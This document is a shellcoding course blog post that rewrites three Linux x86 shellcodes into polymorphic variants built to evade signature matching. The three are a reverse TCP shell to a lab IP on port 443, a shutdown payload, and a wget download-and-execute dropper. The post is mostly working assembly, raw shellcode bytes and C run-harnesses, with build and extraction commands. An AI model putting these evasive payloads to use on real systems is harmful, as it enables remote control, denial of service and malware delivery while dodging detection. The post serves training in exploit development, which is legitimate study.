---
layout: post
title: SLAE32 Assignment6
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching

The polymorphic versions cannot be larger 150% of the existing shellcode

Bonus points for making it shorter in length than original

{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### First Shellcode - reversetcpbindshell  (92 bytes)

[Shellcode link](http://shell-storm.org/shellcode/files/shellcode-849.php){:target="_blank"}

Original Shellcode: 

{% highlight js %}
$ objdump -D reversetcpbindshell -M intel

reversetcpbindshell:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       31 db                   xor    ebx,ebx
 8048064:       31 c9                   xor    ecx,ecx
 8048066:       31 d2                   xor    edx,edx
 8048068:       b0 66                   mov    al,0x66
 804806a:       b3 01                   mov    bl,0x1
 804806c:       51                      push   ecx
 804806d:       6a 06                   push   0x6
 804806f:       6a 01                   push   0x1
 8048071:       6a 02                   push   0x2
 8048073:       89 e1                   mov    ecx,esp
 8048075:       cd 80                   int    0x80
 8048077:       89 c6                   mov    esi,eax
 8048079:       b0 66                   mov    al,0x66
 804807b:       31 db                   xor    ebx,ebx
 804807d:       b3 02                   mov    bl,0x2
 804807f:       68 c0 a8 01 0a          push   0xa01a8c0
 8048084:       66 68 7a 69             pushw  0x697a
 8048088:       66 53                   push   bx
 804808a:       fe c3                   inc    bl
 804808c:       89 e1                   mov    ecx,esp
 804808e:       6a 10                   push   0x10
 8048090:       51                      push   ecx
 8048091:       56                      push   esi
 8048092:       89 e1                   mov    ecx,esp
 8048094:       cd 80                   int    0x80
 8048096:       31 c9                   xor    ecx,ecx
 8048098:       b1 03                   mov    cl,0x3
0804809a <dupfd>:
 804809a:       fe c9                   dec    cl
 804809c:       b0 3f                   mov    al,0x3f
 804809e:       cd 80                   int    0x80
 80480a0:       75 f8                   jne    804809a
 80480a2:       31 c0                   xor    eax,eax
 80480a4:       52                      push   edx
 80480a5:       68 6e 2f 73 68          push   0x68732f6e
 80480aa:       68 2f 2f 62 69          push   0x69622f2f
 80480af:       89 e3                   mov    ebx,esp
 80480b1:       52                      push   edx
 80480b2:       53                      push   ebx
 80480b3:       89 e1                   mov    ecx,esp
 80480b5:       52                      push   edx
 80480b6:       89 e2                   mov    edx,esp
 80480b8:       b0 0b                   mov    al,0xb
 80480ba:       cd 80                   int    0x80
{% endhighlight %}

Polymorphic version:

{% highlight js %}
global _start			

section .text
_start:
	xor    eax,eax
 	xor    ebx,ebx
 	xor    ecx,ecx
	xor    edx,edx
	mov    al,0x66
	mov    bl,0x1
	push   ecx
	push   0x6
	push   0x1
	push   0x2
	mov    ecx,esp
	int    0x80
	mov    esi,eax
	shl    eax,2
	shr    eax,4
	mov    al,0x66
	xor    ebx,ebx
	mov    bl,0x2
	mov    edi,0x1162317c
	add    edi,0x77667744
	mov    dword [esp-4],edi ;ip 192.168.200.136
	mov    cx, 0xbbbc
	add    cx, 0x1111
	sub    cx, 0x11cc
	mov    word [esp-6],cx ;port 443
	sub esp,6
	push   bx
	inc    bl
	mov    ecx,esp
	push   0x10
	push   ecx
	push   esi
	mov    ecx,esp
	int    0x80
	xor    ecx,ecx
	mov    cl,0x3
dupfd:
	dec    cl
	mov    al,0x3f
	int    0x80
	jne    dupfd
	xor    eax,eax
	mov dword [esp-4],edx
	mov dword [esp-8],0x68732f6e ;push   0x68732f6e
	mov dword [esp-12],0x69622f2f ;push   0x69622f2f
	sub esp,12
	mov    ebx,esp
	push   edx
	push   ebx
	mov    ecx,esp
	push   edx
	mov    edx,esp
	mov    al,0xb
	int    0x80
{% endhighlight %}

{% highlight js %}
assembly compilation:
./compile PolyReverseTCP-1

shellcode extraction:
objdump -d ./PolyReverseTCP-1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

shellcode.c compilation:
gcc -fno-stack-protector -z execstack shellcode-poly.c -o shellcode-poly
{% endhighlight %}

shellcode-poly.c:

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xc1\xe0\x02\xc1\xe8\x04\xb0\x66\x31\xdb\xb3\x02\xbf\x7c\x31\x62\x11\x81\xc7\x44\x77\x66\x77\x89\x7c\x24\xfc\x66\xb9\xbc\xbb\x66\x81\xc1\x11\x11\x66\x81\xe9\xcc\x11\x66\x89\x4c\x24\xfa\x83\xec\x06\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x89\x54\x24\xfc\xc7\x44\x24\xf8\x6e\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x2f\x62\x69\x83\xec\x0c\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
;

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
{% endhighlight %}

![assignment6-1](https://bohansec.com/assets/SLAE-assignment6/1.PNG "assignment6-1")

We can see the new shellcode has a size of 138, which is 150% size of the original shellcode.

### Second Shellcode - shutdown -h now Shellcode - 56 bytes

[Shellcode link](http://shell-storm.org/shellcode/files/shellcode-876.php){:target="_blank"}

Original Nasm file:

{% highlight js %}
global _start			

section .text
_start:

    xor eax, eax
    xor edx, edx ; envp
 
    push eax
    push word 0x682d ;-h
    mov edi, esp
 
    push eax
    push byte 0x6e ; now
    mov [esp+1], word 0x776f
    mov edi, esp
 
    push eax
    push 0x6e776f64 ; /sbin/shutdown
    push 0x74756873
    push 0x2f2f2f6e
    push 0x6962732f
    mov ebx, esp
 
    push edx ; null envp
    push esi ; now null
    push edi ; -h null
    push ebx ; /sbin/shutdown null
    mov ecx, esp
    mov al, 11
{% endhighlight %}

Polymorphic version:

{% highlight js %}
global _start			

section .text
_start:

	xor    eax,eax 
	xor    edx,edx
	push   eax     
	push   word 0x682d
	mov    edi,esp
	push   eax
	push   0x6e
	mov    word [esp+0x1],0x776f
	mov    edi,esp
	push   eax
	mov ecx, 0x5D665E53
	add ecx, 0x11111111
	mov dword [esp-4],ecx
	mov dword [esp-8],0x74756873
	shl eax,2
	mov dword [esp-12],0x2f2f2f6e
	shr eax,3
	mov dword [esp-16],0x6962732f
	sub esp,16
	mov    ebx,esp
	push   edx
	push   esi
	push   edi
	push   ebx
	mov    ecx,esp
	mov    al,0xb ;the syscall execve
	int    0x80
{% endhighlight %}

{% highlight js %}
assembly compilation:
./compile PolyShutdown

shellcode extraction:
objdump -d ./PolyShutdown|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

shellcode.c compilation:
gcc -fno-stack-protector -z execstack shellcode-poly.c -o shellcode-poly
{% endhighlight %}

shellcode-poly.c:

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x66\x68\x2d\x68\x89\xe7\x50\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x77\x89\xe7\x50\xb9\x53\x5e\x66\x5d\x81\xc1\x11\x11\x11\x11\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x73\x68\x75\x74\xc1\xe0\x02\xc7\x44\x24\xf4\x6e\x2f\x2f\x2f\xc1\xe8\x03\xc7\x44\x24\xf0\x2f\x73\x62\x69\x83\xec\x10\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
{% endhighlight %}

We can see the new shellcode has a size of 84, which is 150% size of the original shellcode. The machine is shut down after the shellcode executed.

![assignment6-2](https://bohansec.com/assets/SLAE-assignment6/2.PNG "assignment6-2")
![assignment6-3](https://bohansec.com/assets/SLAE-assignment6/3.PNG "assignment6-3")

### Third Shellcode - downloadexec.nasm - 110 bytes

[Shellcode Link](http://shell-storm.org/shellcode/files/shellcode-862.php){:target="_blank"}

This shellcode has only been tested on Ubuntu 12.04 32 bits

Original NASM code:

{% highlight js %}
global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.200.134/x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x78 ;x avoid null byte
    push 0x2f343331 ;/431 
    push 0x2e303032 ;.002
    push 0x2e383631 ;.861
    push 0x2e323931 ;.291
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
{% endhighlight %}

Polymorphic version:

{% highlight js %}
global _start

section .text

_start:

    ;fork
    xor eax,eax
    shl eax,5
    shr eax,6
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    cmp esi,edi
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    cld
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    std
    xor ecx, ecx
    cmp esi,edi
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.200.134/x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x78 ;x avoid null byte
    push 0x2f343331 ;/431 
    cdq
    push 0x2e303032 ;.002
    std
    push 0x2e383631 ;.861
    cmp  esi,edi
    push 0x2e323931 ;.291 
    cdq
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    mov  esi, 0x101221DA
    add  esi, 0x55555555
    mov  dword [esp-4],esi
    mov  esi, 0x2A251DEB
    add  esi, 0x44444444
    mov  dword [esp-8],esi
    mov  esi, 0x3F4041FC
    add  esi, 0x33333333
    mov  dword [esp-12],esi
    sub  esp,12
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
{% endhighlight %}

{% highlight js %}
assembly compilation:
./compile PolyDownload

shellcode extraction:
objdump -d ./PolyDownload|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

shellcode.c compilation:
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
{% endhighlight %}

shellcode.c:
{% highlight js %}
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\xc1\xe0\x05\xc1\xe8\x06\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x30\x31\xc0\x39\xfe\xb0\x07\xcd\x80\x31\xc9\xfc\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\xfd\x31\xc9\x39\xfe\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x6a\x78\x68\x31\x33\x34\x2f\x99\x68\x32\x30\x30\x2e\xfd\x68\x31\x36\x38\x2e\x39\xfe\x68\x31\x39\x32\x2e\x99\x89\xe1\x52\x6a\x74\xbe\xda\x21\x12\x10\x81\xc6\x55\x55\x55\x55\x89\x74\x24\xfc\xbe\xeb\x1d\x25\x2a\x81\xc6\x44\x44\x44\x44\x89\x74\x24\xf8\xbe\xfc\x41\x40\x3f\x81\xc6\x33\x33\x33\x33\x89\x74\x24\xf4\x83\xec\x0c\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";
int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
{% endhighlight %}

![assignment6-4](https://bohansec.com/assets/SLAE-assignment6/4.PNG "assignment6-4")
![assignment6-5](https://bohansec.com/assets/SLAE-assignment6/5.PNG "assignment6-5")

We can see the new shellcode has a size of 160, which is less than 150% size of the original shellcode. The file "x" is a "whoami" executable. We see it executed after the download.

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment6){:target="_blank"}.

Thanks for reading :)



